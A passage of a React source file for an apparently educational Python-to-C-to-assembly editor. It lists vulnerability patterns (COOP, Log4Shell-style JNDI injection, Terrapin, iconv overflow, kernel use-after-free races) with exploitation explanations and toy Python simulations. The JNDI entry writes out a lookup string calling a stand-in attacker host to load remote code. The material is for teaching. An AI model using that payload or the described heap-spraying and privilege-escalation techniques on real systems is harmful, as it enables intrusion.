      patterns: ['cmpl', 'movl', 'addl'],
      description: 'cmpl in the while loop acts as the DOP dispatcher, re-entering the gadget chain each iteration without any indirect call or ret corruption; movl loads the corrupted virtual-PC (vpc) selecting which gadget fires; addl performs the arithmetic micro-operation on attacker-controlled operands — the entire exploit runs within valid control flow, invisible to CFI, CET shadow stacks, and ARM PAC',
    },
  },
  {
    id: 'coop-vfunc-chain',
    name: 'COUNTERFEIT OOP CHAIN',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Chains legitimate C++ virtual function calls on attacker-crafted counterfeit objects to achieve arbitrary computation, bypassing CFI, Control Flow Guard, and Intel CET.',
    explanation:
      'Counterfeit Object-Oriented Programming (COOP), introduced by Schuster et al. (IEEE S&P 2015), is a code-reuse ' +
      'attack that chains legitimate C++ virtual function invocations — each through a real, compiler-emitted call site — ' +
      'on attacker-controlled counterfeit objects. Unlike ROP or JOP, every indirect call in a COOP chain targets a valid ' +
      'function at a valid call site, making the attack invisible to both coarse-grained and many fine-grained Control Flow ' +
      'Integrity (CFI) implementations, including Microsoft\'s Control Flow Guard (CFG) and Intel CET with shadow stacks. ' +
      'The attacker injects a block of counterfeit C++ objects into the victim\'s address space via a heap spray or buffer ' +
      'overflow. Each counterfeit object carries an attacker-chosen vptr that points to an existing vtable, and attacker-chosen ' +
      'data fields that serve as operands. A "main-loop gadget" (ML-G) — a virtual function containing a loop that iterates ' +
      'over an array of object pointers and calls a virtual method on each — acts as the dispatcher. Each iteration invokes a ' +
      'different virtual-function gadget (vfgadget): ARITH-G for arithmetic on attacker operands, W-G for memory writes, ' +
      'R-G for memory reads, W-COND-G for conditional branches, and INV-G for invoking system APIs. Together they form a ' +
      'Turing-complete virtual machine running entirely within valid control flow. CVE-2019-0539 (Chakra JIT type confusion ' +
      'in Microsoft Edge, CVSS 7.5) was exploited using COOP gadget chains to bypass CFG on Windows 10. Researchers also ' +
      'demonstrated full COOP exploits against Internet Explorer 10/11, showing that even C++-aware defenses like CPS, T-VIP, ' +
      'vfGuard, and VTint are defeated. In 2023, OffSec demonstrated COOP bypassing Intel CET on the latest Windows releases, ' +
      'proving the technique remains viable against state-of-the-art hardware-assisted CFI. ' +
      'In the assembly, each call to invoke() generates a call instruction that CFI validates as legitimate because it targets ' +
      'a real function; movl loads the counterfeit object\'s vptr-selected field values as operands; the dispatcher\'s cmpl/jl ' +
      're-enters the loop for the next counterfeit object — no ret gadget, no indirect jmp, and no corrupted code pointer is ' +
      'ever used.',
    code:
`# CVE pattern: COOP — counterfeit objects chain vfunc calls past CFI
class ArithVFG:
    def __init__(self, operand):
        self.vptr = 1
        self.field_a = operand
        self.result = 0

    def invoke(self, acc):
        self.result = acc + self.field_a
        return self.result

class WriteVFG:
    def __init__(self, target):
        self.vptr = 2
        self.field_a = target
        self.result = 0

    def invoke(self, acc):
        self.result = self.field_a
        return self.result

class CondVFG:
    def __init__(self, threshold):
        self.vptr = 3
        self.field_a = threshold
        self.result = 0

    def invoke(self, acc):
        if acc > self.field_a:
            self.result = 1
        else:
            self.result = 0
        return self.result

class MainLoopGadget:
    def __init__(self, count):
        self.count = count
        self.vpc = 0
        self.acc = 0

    def dispatch(self, g0, g1, g2):
        i = 0
        while i < self.count:
            self.vpc = i
            if i == 0:
                self.acc = g0.invoke(self.acc)
            elif i == 1:
                self.acc = g1.invoke(self.acc)
            elif i == 2:
                self.acc = g2.invoke(self.acc)
            i += 1
        return self.acc

fake0 = ArithVFG(48879)
fake1 = ArithVFG(16657)
fake2 = CondVFG(60000)
ml = MainLoopGadget(3)
hijacked = ml.dispatch(fake0, fake1, fake2)
print(hijacked)
`,
    badAsm: {
      patterns: ['call', 'movl', 'cmpl'],
      description: 'call instructions target real virtual functions through compiler-emitted call sites — CFI validates each as legitimate because the target is a valid vfgadget entry point; movl loads attacker-chosen field values (vptr, field_a) from each counterfeit object as operands for the vfgadget micro-operation; cmpl in the dispatcher loop re-enters the chain for the next counterfeit object, forming a Turing-complete virtual machine invisible to CFG, Intel CET, and shadow stacks',
    },
  },
  {
    id: 'jndi-injection',
    name: 'JNDI INJECTION',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'User-controlled string in a log message triggers a JNDI lookup to an attacker server, which returns a malicious class for remote code execution.',
    explanation:
      'JNDI Injection (CWE-917 / CWE-20) occurs when user-supplied input containing a lookup expression — such as ' +
      '${jndi:ldap://evil.com/payload} — is passed to a logging or naming framework that resolves the expression ' +
      'before sanitizing it. The framework performs a JNDI (Java Naming and Directory Interface) lookup to an ' +
      'attacker-controlled LDAP or RMI server, which returns a Reference object pointing to a remote Java class. ' +
      'The JVM fetches, loads, and instantiates the malicious class, executing the attacker\'s static initializer ' +
      'or constructor — achieving unauthenticated remote code execution with the privileges of the application. ' +
      'CVE-2021-44228 (Log4Shell, CVSS 10.0) is the defining example and one of the most impactful vulnerabilities ' +
      'in computing history: Apache Log4j 2.x processed ${jndi:...} expressions in logged strings, meaning any ' +
      'application field written to a log — HTTP User-Agent, search queries, usernames, API parameters — became an ' +
      'RCE vector. Over 35,000 packages (8% of Maven Central) were affected; CISA, NSA, and Five Eyes issued joint ' +
      'emergency directives. Exploitation began within hours of disclosure in December 2021, with state-sponsored ' +
      'actors (HAFNIUM, APT41) and ransomware groups (Conti, Khonsari) weaponizing it for mass compromise. ' +
      'CVE-2025-70974 (Fastjson, CVSS 10.0) allowed JNDI injection via @type deserialization in JSON documents, ' +
      'forcing the parser to resolve attacker-controlled LDAP references. CVE-2026-50633 (Apache CXF) exploited ' +
      'JNDI injection through JCA deployment descriptors for RCE on enterprise service buses. CVE-2021-45046 and ' +
      'CVE-2021-45105 were successive Log4j bypasses of the initial fix, proving the attack surface is inherent to ' +
      'any framework that performs string interpolation before input validation. ' +
      'In the assembly, movl loads the attacker-supplied lookup reference value into a stack slot via the log method; ' +
      'resolve_lookup\'s cmpl checks lookup_enabled == 1 and passes the reference through without sanitization — ' +
      'fetch_remote\'s addl combines the attacker\'s reference with the server base address to compute the payload ' +
      'address, and execute\'s addl invokes the loaded class with no type validation or origin check.',
    code:
`# CVE pattern: logged user input triggers JNDI lookup — loads remote class
class Logger:
    def __init__(self, level):
        self.level = level
        self.log_count = 0
        self.last_msg = 0
        self.lookup_enabled = 1

    def log(self, message):
        self.last_msg = message
        self.log_count += 1
        return self.last_msg

    def resolve_lookup(self, ref):
        if self.lookup_enabled == 1:
            result = ref
        else:
            result = 0
        return result

class NamingContext:
    def __init__(self, base_url):
        self.base_url = base_url
        self.loaded_class = 0
        self.executed = 0

    def fetch_remote(self, ref):
        self.loaded_class = self.base_url + ref
        return self.loaded_class

    def execute(self):
        self.executed = 1
        result = self.loaded_class + self.executed
        return result

logger = Logger(1)
attacker_input = 3735928559
logger.log(attacker_input)
jndi_ref = logger.resolve_lookup(attacker_input)
ctx = NamingContext(4196352)
payload = ctx.fetch_remote(jndi_ref)
hijacked = ctx.execute()
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl'],
      description: 'movl loads the attacker-supplied lookup reference (0xDEADBEEF) into a stack slot via the log method; cmpl in resolve_lookup checks lookup_enabled == 1 and passes the reference through without sanitization — fetch_remote\'s addl combines the reference with the LDAP server base address to compute the malicious class address, and execute\'s addl invokes it with no type or origin check, achieving unauthenticated RCE',
    },
  },
  {
    id: 'seq-num-desync',
    name: 'SEQUENCE NUMBER DESYNC',
    severity: 'CRITICAL',
    category: 'Injection',
    description: 'Man-in-the-middle manipulates protocol sequence counters to desynchronize sender and receiver state machines, enabling silent message truncation and security downgrade.',
    explanation:
      'Sequence number desynchronization (CWE-354 / CWE-757) exploits protocols that use incrementing sequence ' +
      'counters to order and authenticate messages. A man-in-the-middle injects or drops unauthenticated messages ' +
      'during the handshake phase — before the secure channel is established — to shift the sequence counter on one ' +
      'side without the other\'s knowledge. Once the encrypted channel begins, the attacker deletes a precisely ' +
      'chosen number of ciphertext messages from the wire; the receiver, whose counter is now offset, decrypts ' +
      'subsequent messages with the wrong sequence number but the cipher still accepts them because the injected ' +
      'offset was pre-compensated during the handshake. The result: the attacker silently truncates the beginning ' +
      'of the secure session, removing security-critical negotiation messages such as feature extensions or ' +
      'downgrade-protection flags. ' +
      'CVE-2023-48795 (Terrapin, CVSS 5.9) is the defining example: the SSH Binary Packet Protocol\'s ChaCha20-Poly1305 ' +
      'and Encrypt-then-MAC cipher suites used sequence numbers as implicit nonces but did not bind the handshake ' +
      'transcript to the counter state. A MitM injected SSH_MSG_IGNORE packets during key exchange (incrementing the ' +
      'server\'s send counter), then deleted the same number of encrypted packets after SSH_MSG_NEWKEYS — stripping ' +
      'SSH_MSG_EXT_INFO and disabling keystroke-timing countermeasures. Over 77% of internet-facing SSH servers were ' +
      'vulnerable at disclosure. The fix ("strict kex") resets sequence numbers at SSH_MSG_NEWKEYS and rejects ' +
      'unexpected messages during key exchange. CVE-2024-45337 (Go x/crypto/ssh, CVSS 9.1) showed the class extends ' +
      'beyond OpenSSH: the Go SSH library\'s handshake callback could be bypassed entirely, granting unauthenticated ' +
      'access. CVE-2016-0777 (OpenSSH roaming) exploited a similar state desync to leak client private keys. ' +
      'In the assembly, movl loads the initial sequence counter; addl in inject_ignore increments send_seq without ' +
      'a corresponding increment on recv_seq — cmpl in verify_seq compares the desynchronized counters and the ' +
      'mismatch lets the attacker\'s movl overwrite the ext_info field with zero, silently disabling security extensions.',
    code:
`# CVE pattern: MitM shifts sequence counter — truncates security extensions
class Channel:
    def __init__(self, send_seq, recv_seq):
        self.send_seq = send_seq
        self.recv_seq = recv_seq
        self.ext_info = 0
        self.secured = 0

    def send_msg(self, msg_type):
        self.send_seq += 1
        return self.send_seq

    def recv_msg(self):
        self.recv_seq += 1
        return self.recv_seq

class MitM:
    def __init__(self, injected):
        self.injected = injected
        self.dropped = 0
        self.desync = 0

    def inject_ignore(self, channel, count):
        i = 0
        while i < count:
            channel.send_seq += 1
            self.injected += 1
            i += 1
        self.desync = self.injected
        return self.desync

    def drop_after_newkeys(self, channel, count):
        i = 0
        while i < count:
            self.dropped += 1
            i += 1
        return self.dropped

    def strip_ext_info(self, channel):
        channel.ext_info = 0
        return channel.ext_info

class Handshake:
    def __init__(self, strict_kex):
        self.strict_kex = strict_kex
        self.ext_negotiated = 0
        self.downgraded = 0

    def negotiate(self, channel):
        if channel.ext_info == 1:
            self.ext_negotiated = 1
        else:
            self.downgraded = 1
        return self.downgraded

server = Channel(0, 0)
server.ext_info = 1
attacker = MitM(0)
attacker.inject_ignore(server, 3)
server.send_msg(1)
attacker.drop_after_newkeys(server, 3)
attacker.strip_ext_info(server)
hs = Handshake(0)
hs.negotiate(server)
result = server.send_seq + hs.downgraded
print(result)
`,
    badAsm: {
      patterns: ['addl', 'cmpl', 'movl'],
      description: 'addl increments send_seq in the inject_ignore loop without a matching recv_seq increment, desynchronizing the counters; cmpl in negotiate checks ext_info — which the attacker\'s movl has zeroed via strip_ext_info — and the branch sets downgraded=1, silently disabling security extensions the same way Terrapin strips SSH_MSG_EXT_INFO from the encrypted channel',
    },
  },
  {
    id: 'iconv-bof',
    name: 'ICONV BUFFER OVERFLOW',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Missing bounds check in glibc iconv() ISO-2022-CN-EXT escape sequence emission overflows the output buffer by up to 4 bytes, corrupting adjacent heap metadata for arbitrary code execution.',
    explanation:
      'The GNU C Library\'s iconv() character set conversion function (glibc <= 2.39) contains an out-of-bounds ' +
      'write (CWE-787) in the ISO-2022-CN-EXT codec. When converting from UCS-4 to ISO-2022-CN-EXT, certain ' +
      'input characters require multi-byte escape sequences (SS2/SS3 designation) to signal a character set ' +
      'switch. The vulnerable code writes these escape bytes — ESC, "$", "*", and a set indicator — into the ' +
      'output buffer without verifying that enough space remains, allowing a 1-to-4-byte write past the end ' +
      'of the caller-supplied buffer. ' +
      'CVE-2024-2961 (CVSS 8.8) is the defining instance. The CNEXT exploit chain demonstrated full remote ' +
      'code execution against PHP applications: an attacker sends crafted multi-byte input to any code path ' +
      'that calls iconv() or uses the php://filter iconv wrapper. The overflow lands in an adjacent tcache ' +
      'free chunk on the glibc heap, corrupting its forward pointer (fd). Through careful heap grooming — ' +
      'arranging allocations so a freed tcache chunk sits directly after the iconv output buffer — the ' +
      'attacker redirects the next malloc() return to an arbitrary address, achieving a write-what-where ' +
      'primitive. From there, overwriting __free_hook or the GOT entry for a frequently called function ' +
      'yields code execution. The bug affected every Linux distribution shipping glibc 2.1.93 through 2.39, ' +
      'spanning over two decades of deployments. ' +
      'In the assembly, movl stores each escape byte into the output buffer via an offset from the base ' +
      'pointer; the critical flaw is the absent cmpl that should compare buf.used against buf.capacity before ' +
      'each write — addl blindly increments the write cursor past the allocation boundary, and the subsequent ' +
      'movl overwrites the victim chunk\'s fd_ptr field, redirecting the tcache freelist.',
    code:
`# CVE pattern: iconv escape-sequence write overflows output into adjacent heap chunk
class IconvBuffer:
    def __init__(self, capacity):
        self.capacity = capacity
        self.used = 0
        self.data = 0
        self.overflow = 0

    def write_byte(self, val):
        self.used += 1
        self.data = val
        return self.used

    def check_bounds(self):
        if self.used > self.capacity:
            self.overflow = self.used - self.capacity
        return self.overflow

class CharsetConverter:
    def __init__(self, escape_len):
        self.escape_len = escape_len
        self.converted = 0
        self.escapes_written = 0

    def convert_char(self, buf, char_val):
        i = 0
        while i < self.escape_len:
            buf.write_byte(27)
            self.escapes_written += 1
            i += 1
        buf.write_byte(char_val)
        self.converted += 1
        return self.converted

class TcacheChunk:
    def __init__(self, fd_ptr, size):
        self.fd_ptr = fd_ptr
        self.size = size
        self.corrupted = 0

    def check_metadata(self, expected_fd):
        if self.fd_ptr != expected_fd:
            self.corrupted = 1
        return self.corrupted

output = IconvBuffer(8)
victim = TcacheChunk(4919, 64)
conv = CharsetConverter(4)
conv.convert_char(output, 65)
conv.convert_char(output, 66)
output.check_bounds()
if output.overflow > 0:
    victim.fd_ptr = 0
    victim.check_metadata(4919)
result = output.overflow + victim.corrupted
print(result)
`,
    badAsm: {
      patterns: ['movl', 'addl', 'cmpl'],
      description: 'movl stores each escape byte at the current buffer offset without a preceding cmpl against capacity — addl increments used past the allocation boundary on every write_byte call in the convert_char loop, and the final movl that writes char_val lands 2 bytes beyond the buffer, overwriting the adjacent TcacheChunk\'s fd_ptr field the same way CVE-2024-2961\'s 4-byte overflow corrupts a tcache forward pointer to hijack malloc',
    },
  },
  {
    id: 'ub-null-elision',
    name: 'UNDEFINED BEHAVIOR NULL ELISION',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Compiler optimizes away a NULL-pointer safety check because a prior dereference implies the pointer cannot be NULL — attacker maps code at address zero for privilege escalation.',
    explanation:
      'Undefined behavior null elision (CWE-476 / CWE-733) is a compiler-induced vulnerability where the C ' +
      'optimizer removes a security-critical NULL check because the pointer was already dereferenced earlier in ' +
      'the function. Under the C standard, dereferencing NULL is undefined behavior — so the compiler infers that ' +
      'a pointer that has been dereferenced "must" be non-NULL, and eliminates any subsequent NULL guard as dead ' +
      'code. If the pointer actually IS null at runtime (e.g. a failed allocation, an uninitialized struct field), ' +
      'the absent check lets execution continue with address zero, where the attacker has mapped shellcode via ' +
      'mmap on older kernels without mmap_min_addr protection. ' +
      'CVE-2009-1897 (Linux kernel tun_chr_poll) is the textbook example: the tun driver dereferenced a socket ' +
      'pointer to read its flags, then checked if the pointer was NULL — GCC (correctly, per the standard) ' +
      'optimized the NULL check away since dereferencing it first constituted UB if NULL, meaning it "could not" ' +
      'be NULL. An attacker mapped executable code at page zero, triggered the path with a NULL socket, and ' +
      'achieved kernel-mode code execution. CVE-2009-1895 (Linux kernel, personality flags) similarly allowed ' +
      'an unprivileged user to map page zero and exploit a removed NULL check for local privilege escalation. ' +
      'USENIX Security 2023 ("Silent Bugs Matter") systematically found 47 compiler-introduced security bugs in ' +
      'the Linux kernel caused by UB-driven optimizations, including NULL-check removals, dead-store eliminations ' +
      'that zeroed passwords, and signed-overflow assumption violations that removed bounds checks. CERT issued ' +
      'vulnerability note VU#162289 against GCC itself for this behavior class. The Linux kernel adopted ' +
      '-fno-delete-null-pointer-checks as a mandatory CFLAGS defense in 2009 (commit a3ca86aea5) and ' +
      '-fwrapv to prevent signed-overflow UB exploitation. ' +
      'In the assembly, the first movl dereferences the pointer (reading obj.flags from offset 0) before any ' +
      'guard; cmpl that should check ptr == 0 is ABSENT from the compiled output because the optimizer eliminated ' +
      'it — addl proceeds to use the zero-derived address, and the CPU executes attacker code mapped at 0x0.',
    code:
`# CVE pattern: compiler removes NULL check after prior deref — code at 0x0
class KernelObj:
    def __init__(self, flags, handler):
        self.flags = flags
        self.handler = handler
        self.refcount = 1

    def read_flags(self):
        result = self.flags + self.handler
        return result

class Driver:
    def __init__(self, capacity):
        self.capacity = capacity
        self.obj_flags = 0
        self.checked = 0
        self.result = 0

    def poll(self, obj):
        self.obj_flags = obj.flags
        if obj.handler == 0:
            self.checked = 1
        self.result = self.obj_flags + obj.handler
        return self.result

    def exploit_null(self, shellcode_addr):
        result = self.obj_flags + shellcode_addr
        return result

obj = KernelObj(0, 0)
drv = Driver(64)
drv.poll(obj)
mapped_page_zero = 3735928559
hijacked = drv.exploit_null(mapped_page_zero)
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl dereferences obj.flags from the pointer before any NULL guard appears; the compiler eliminates the subsequent cmpl against zero as dead code (since dereferencing implies non-NULL under UB rules) — addl proceeds with the zero-derived address unchecked, and on a system without mmap_min_addr the CPU executes attacker shellcode mapped at page zero',
    },
  },
  {
    id: 'posix-timer-zombie',
    name: 'POSIX TIMER ZOMBIE RACE',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'POSIX CPU timer handler fires on a zombie task whose structures are concurrently reaped, producing a use-after-free on freed task memory for kernel privilege escalation.',
    explanation:
      'POSIX timer zombie race (CWE-362 / CWE-416) exploits a timing window in the Linux kernel\'s POSIX CPU ' +
      'timer subsystem: handle_posix_cpu_timers() runs in IRQ context on every scheduler tick to check whether ' +
      'any CPU timers have expired, but it is allowed to execute even when the owning task has transitioned to ' +
      'EXIT_ZOMBIE state. After a thread calls exit_notify() and releases its sighand lock, the parent process ' +
      'or debugger can immediately reap the zombie — freeing the task_struct and its embedded timer list. ' +
      'Meanwhile, handle_posix_cpu_timers() on another CPU still holds a stale reference from its earlier ' +
      'lock_task_sighand() call: it traverses the now-freed timer list, dereferencing pointers into reclaimed ' +
      'slab memory. An attacker heap-sprays the freed task_struct slot with controlled data, redirecting the ' +
      'timer handler\'s function pointer dereference to achieve arbitrary code execution in kernel context. ' +
      'CVE-2025-38352 (CVSS 7.8, CISA KEV, actively exploited) is the defining instance: the race between ' +
      'handle_posix_cpu_timers() and posix_cpu_timer_del() on an exiting non-autoreaping task produced a ' +
      'UAF that the "Chronomaly" PoC weaponized for root on 32-bit Android devices. The September 2025 ' +
      'Android Security Bulletin confirmed limited, targeted exploitation in the wild. The flaw requires ' +
      'at least two CPUs: one executing the IRQ timer handler, the other reaping the zombie. Systems with ' +
      'CONFIG_POSIX_CPU_TIMERS_TASK_WORK disabled (most 32-bit Android kernels) lack the task-work path ' +
      'that would serialize timer deletion, making them directly exploitable. ' +
      'In the assembly, movl stores the timer handler address and task state into stack slots; after the zombie ' +
      'transition, cmpl checks exit_state but the IRQ context on the other CPU has already passed this check — ' +
      'addl dereferences the freed timer_list pointer, reading attacker-sprayed data from the reclaimed slab.',
    code:
`# CVE pattern: IRQ timer fires on zombie task — freed timer list dereferenced
class TaskStruct:
    def __init__(self, pid, handler):
        self.pid = pid
        self.handler = handler
        self.exit_state = 0
        self.timer_val = 0
        self.reaped = 0

    def exit_notify(self):
        self.exit_state = 1
        return self.exit_state

    def reap(self):
        self.handler = 0
        self.timer_val = 0
        self.reaped = 1
        return self.reaped

class TimerIRQ:
    def __init__(self, cpu_id):
        self.cpu_id = cpu_id
        self.stale_ref = 0
        self.result = 0

    def lock_sighand(self, task):
        self.stale_ref = task.handler
        return self.stale_ref

    def handle_timers(self, task):
        result = task.handler + task.timer_val
        self.result = result
        return self.result

task = TaskStruct(1337, 4196352)
task.timer_val = 256
irq = TimerIRQ(1)
irq.lock_sighand(task)
task.exit_notify()
task.reap()
task.handler = 3735928559
task.timer_val = 4196608
leaked = irq.handle_timers(task)
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'cmpl', 'addl'],
      description: 'movl stores the timer handler address and task state into stack slots during lock_sighand; after exit_notify sets exit_state=1, reap zeroes the handler — but the IRQ context on another CPU has already captured the stale reference; addl in handle_timers dereferences the freed timer_list slot where the attacker has sprayed 0xDEADBEEF, achieving kernel code execution via the stale pointer',
    },
  },
  {
    id: 'sctp-asconf-uaf',
    name: 'SCTP ASCONF TRANSPORT UAF',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'SCTP ASCONF identity mismatch frees the cached transport pointer while a subsequent wildcard DEL-IP dereferences it, enabling root and container escape.',
    explanation:
      'SCTP ASCONF transport use-after-free (CVE-2026-64564 / SCTPhantom / CWE-416) exploits an identity ' +
      'mismatch in the Linux kernel\'s SCTP Dynamic Address Reconfiguration (RFC 5061) processing. When an ' +
      'ASCONF chunk arrives, sctp_process_asconf() caches the transport used to process it in asconf->transport. ' +
      'However, __sctp_rcv_asconf_lookup() locates the ASCONF through its Address Parameter, which may reference ' +
      'a different transport than the packet\'s source address. An attacker crafts an ordered ASCONF sequence: ' +
      'a DEL-IP for a non-source address passes the validation check and frees the transport referenced by ' +
      'asconf->transport; a subsequent wildcard DEL-IP (0.0.0.0) then reuses the now-dangling pointer via ' +
      'sctp_assoc_set_primary() and sctp_assoc_del_nonprimary_peers(), triggering a use-after-free. ' +
      'The bug was introduced in Linux 2.6.25 (December 2007) and lay dormant for 18 years. Discovered by ' +
      'Tencent Zhuque Lab and disclosed in August 2026, SCTPhantom achieved root on Ubuntu 24.04, Debian 13, ' +
      'Rocky Linux 9, and kernels 5.14 through 7.2-rc. Because SCTP sockets are available inside unprivileged ' +
      'network namespaces, the exploit also achieves container escape — the freed transport object is reclaimed ' +
      'via cross-cache slab spraying with a cred struct, and overwriting uid/gid to zero escalates to root on ' +
      'the host. Patches landed in stable kernels 6.6.148, 6.12.101, 6.18.42, and 7.1.6. ' +
      'In the assembly, movl stores the transport handler and addr fields into stack slots during process_asconf; ' +
      'del_ip\'s movl zeroes them (freeing the transport), but the cached asconf->transport pointer is never ' +
      'updated — wildcard_del\'s addl dereferences the freed slot where the attacker has sprayed a zeroed cred ' +
      'struct, achieving root via the stale transport pointer.',
    code:
`# CVE pattern: ASCONF identity mismatch frees cached transport — UAF to root
class Transport:
    def __init__(self, addr, handler):
        self.addr = addr
        self.handler = handler
        self.refcount = 1
        self.freed = 0

    def release(self):
        self.handler = 0
        self.addr = 0
        self.freed = 1
        self.refcount = 0
        return self.freed

class AsconfState:
    def __init__(self, src_transport, cached_transport):
        self.src_transport = src_transport
        self.cached = cached_transport
        self.processed = 0

    def del_ip(self, target):
        if target.addr == self.cached.addr:
            target.release()
            self.processed += 1
        return self.processed

    def wildcard_del(self):
        result = self.cached.handler + self.cached.addr
        self.processed += 1
        return result

t1 = Transport(167772161, 4196352)
t2 = Transport(167772162, 4196608)
asconf = AsconfState(t1, t2)
asconf.del_ip(t2)
t2.handler = 3735928559
t2.addr = 0
leaked = asconf.wildcard_del()
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the transport handler and addr fields during construction; del_ip\'s movl zeroes them (simulating free) but the cached asconf->transport pointer is never cleared — wildcard_del\'s addl dereferences the freed slot where the attacker has sprayed 0xDEADBEEF, achieving kernel code execution via the stale SCTP transport pointer',
    },
  },
]

// ─── Severity helpers ──────────────────────────────────────────────────────

const SEVERITY_COLOR: Record<string, string> = {
  CRITICAL: 'var(--red)',
  HIGH: '#ff8c00',
  MEDIUM: 'var(--cyan)',
}

function sampleN<T>(arr: T[], n: number): T[] {
  const a = [...arr]
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1))
    ;[a[i], a[j]] = [a[j], a[i]]
  }
  return a.slice(0, Math.min(n, a.length))
}

const STARTER = `# Write Python below and click [> COMPILE]
x = 10
y = 20

for i in range(5):
    x += i

if x > 30:
    print(x)
else:
    print(y)
`

// ─── EditorPage ────────────────────────────────────────────────────────────

export default function EditorPage() {
  const [code, setCode] = useState(STARTER)
  const [result, setResult] = useState<CompileResponse | null>(null)
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)
  const [method, setMethod] = useState<CompileMethod>('transpile')
  const [activePyLine, setActivePyLine] = useState<number | null>(null)
  const [activeVuln, setActiveVuln] = useState<Vuln | null>(null)
  const [sidebarOpen, setSidebarOpen] = useState(true)
  const [displayedVulns] = useState(() => sampleN(VULNS, 10))
  const [paneOrder, setPaneOrder] = useState<Array<'python' | 'c' | 'asm'>>(['python', 'c', 'asm'])
  const [closedPanes, setClosedPanes] = useState(new Set<string>())
  const [dragOver, setDragOver] = useState<string | null>(null)
  const dragSrc = useRef<string | null>(null)
  const editorViewRef = useRef<EditorView | null>(null)

  async function handleCompile() {
    setLoading(true)
    setError('')
    setActivePyLine(null)
    try {
      const res = await compile(code, method)
      setResult(res)
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : 'Compilation failed')
    } finally {
      setLoading(false)
    }
  }

  function handleCodeChange(val: string) {
    setCode(val)
    // Clear vuln advisory when user manually edits
    if (activeVuln) setActiveVuln(null)
  }

  function selectVuln(v: Vuln) {
    setCode(v.code)
    setActiveVuln(v)
    setResult(null)
    setError('')
    setActivePyLine(null)
  }

  function handlePythonLineClick(e: React.MouseEvent<HTMLDivElement>) {
    if (!result) return
    const view = editorViewRef.current
    if (!view) return
    const pos = view.posAtCoords({ x: e.clientX, y: e.clientY })
    if (pos === null) return
    const lineNo = view.state.doc.lineAt(pos).number
    if (!result.line_map[lineNo]) return
    setActivePyLine(prev => prev === lineNo ? null : lineNo)
  }

  function closePane(pane: string) { setClosedPanes(prev => new Set([...prev, pane])) }
  function openPane(pane: string) { setClosedPanes(prev => { const n = new Set(prev); n.delete(pane); return n }) }

  function movePane(pane: string, direction: -1 | 1) {
    setPaneOrder(prev => {
      const o = [...prev] as Array<'python' | 'c' | 'asm'>
      const idx = o.indexOf(pane as 'python' | 'c' | 'asm')
      // Skip past any closed panes to find the nearest visible neighbour
      let swapIdx = idx + direction
      while (swapIdx >= 0 && swapIdx < o.length) {
        if (!closedPanes.has(o[swapIdx])) {
          ;[o[idx], o[swapIdx]] = [o[swapIdx], o[idx]]
          return o
        }
        swapIdx += direction
      }
      return o
    })
  }

  function handlePaneDragStart(pane: string, e: React.DragEvent) {
    dragSrc.current = pane
    e.dataTransfer.effectAllowed = 'move'
  }
  function handlePaneDragOver(pane: string, e: React.DragEvent) {
    e.preventDefault()
    e.dataTransfer.dropEffect = 'move'
    if (dragSrc.current !== pane) setDragOver(pane)
  }
  function handlePaneDrop(pane: string, e: React.DragEvent) {
    e.preventDefault()
    if (dragSrc.current && dragSrc.current !== pane) {
      setPaneOrder(prev => {
        const o = [...prev] as Array<'python' | 'c' | 'asm'>
        const si = o.indexOf(dragSrc.current as 'python' | 'c' | 'asm')
        const ti = o.indexOf(pane as 'python' | 'c' | 'asm')
        ;[o[si], o[ti]] = [o[ti], o[si]]
        return o
      })
    }
    dragSrc.current = null
    setDragOver(null)
  }

  // Build color highlight maps
  const pyHighlight: Record<number, string> = {}
  const cHighlight: Record<number, string> = {}
  const asmHighlight: Record<number, string> = {}
  const asmToInfo: Record<number, AsmLineInfo> = {}

  if (result) {
    for (const [pyLineStr, mapping] of Object.entries(result.line_map)) {
      const m = mapping as LineMapping
      const pyLine = Number(pyLineStr)
      const pyCode = result.python_lines[pyLine - 1] ?? ''
      pyHighlight[pyLine] = m.color
      for (const cl of m.c_lines) cHighlight[cl] = m.color
      for (const al of m.asm_lines) {
        asmHighlight[al] = m.color
        asmToInfo[al] = { pyLine, pyCode, color: m.color }
      }
    }
  }

  const activeCLines = new Set<number>()
  const activeAsmLines = new Set<number>()

  if (activePyLine && result) {
    const m = result.line_map[activePyLine] as LineMapping | undefined
    if (m) {
      m.c_lines.forEach(l => activeCLines.add(l))
      m.asm_lines.forEach(l => activeAsmLines.add(l))
    }
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100vh', background: 'var(--bg-base)' }}>

      {/* ── Header ── */}
      <div style={{
        display: 'flex',
        alignItems: 'center',
        padding: '8px 20px',
        background: 'var(--bg-header)',
        borderBottom: '1px solid var(--border-mid)',
        gap: 16,
        flexShrink: 0,
      }}>
        <span style={{ fontWeight: 700, fontSize: 16, letterSpacing: '0.12em', fontFamily: 'Fira Code, monospace' }}>
          <span style={{ color: 'var(--green)' }}>CYBER</span>
          <span style={{ color: 'var(--text-dim)' }}>//</span>
          <span style={{ color: 'var(--cyan)' }}>ASM</span>
          <span className="cursor-blink" style={{ color: 'var(--green)', marginLeft: 2 }}>_</span>
        </span>

        <span style={{ color: 'var(--border-bright)', fontSize: 10 }}>|</span>

        <span style={{ fontSize: 11, color: 'var(--text-dim)', fontFamily: 'Fira Code, monospace', letterSpacing: '0.04em' }}>
          SELECT PYTHON LINE → TRACE C → ASM
        </span>

        <span style={{ flex: 1 }} />

        {loading && (
          <span style={{ fontSize: 11, color: 'var(--cyan)', letterSpacing: '0.08em' }}>◈ COMPILING...</span>
        )}
        {result && !loading && (
          <span style={{ fontSize: 11, color: 'var(--green)', letterSpacing: '0.08em' }}>◉ COMPILED OK</span>
        )}

        {/* Backend selector — drives the `method` field on /compile.
            transpile = AST→C→gcc (fast, supports per-line trace);
